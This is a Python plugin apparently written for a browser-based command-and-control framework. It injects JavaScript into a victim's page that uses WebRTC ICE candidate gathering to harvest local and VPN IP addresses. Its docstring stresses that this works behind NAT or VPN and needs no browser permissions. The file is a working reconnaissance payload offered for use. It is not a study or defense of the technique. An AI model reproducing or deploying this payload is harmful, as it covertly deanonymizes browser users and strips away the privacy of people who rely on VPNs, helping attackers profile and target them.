from c2.plugins.internal.plugins import BasePlugin


class WebRTCLeaksPlugin(BasePlugin):
    name = "webrtcleaks"

    async def get_ips(self) -> list:
        """Discovers local/VPN IP addresses that the browser leaks via WebRTC.

        Creates an RTCPeerConnection, adds a data channel to trigger candidate
        gathering, and collects all ICE candidates. IPv4 and IPv6 addresses
        embedded in the candidate strings are extracted and returned.

        No STUN/TURN servers are used, so only host candidates (local network
        interfaces) are gathered. This works even when the user is behind a NAT
        or VPN, and does NOT require any browser permissions.

        :return: List of unique IP address strings discovered
        :rtype: list
        """
        return await self.methods.eval_js('''
            return new Promise(function(resolve) {
                var ips  = [];
                var seen = new Set();
                var pc   = new RTCPeerConnection({ iceServers: [] });

                pc.createDataChannel('');

                var finish = function() {
                    pc.close();
                    resolve(ips);
                };

                // Collect IPs from each candidate line
                pc.onicecandidate = function(e) {
                    if (!e.candidate) { finish(); return; }
                    var line = e.candidate.candidate;
                    var matches = line.match(/(\d+\.\d+\.\d+\.\d+|[0-9a-f]{0,4}(?::[0-9a-f]{0,4}){2,7})/gi);
                    if (matches) {
                        matches.forEach(function(ip) {
                            if (!seen.has(ip)) { seen.add(ip); ips.push(ip); }
                        });
                    }
                };

                pc.createOffer()
                    .then(function(offer) { return pc.setLocalDescription(offer); })
                    .catch(finish);

                // Safety timeout in case onicecandidate never fires null
                setTimeout(finish, 4000);
            });
        ''', timeout=7)
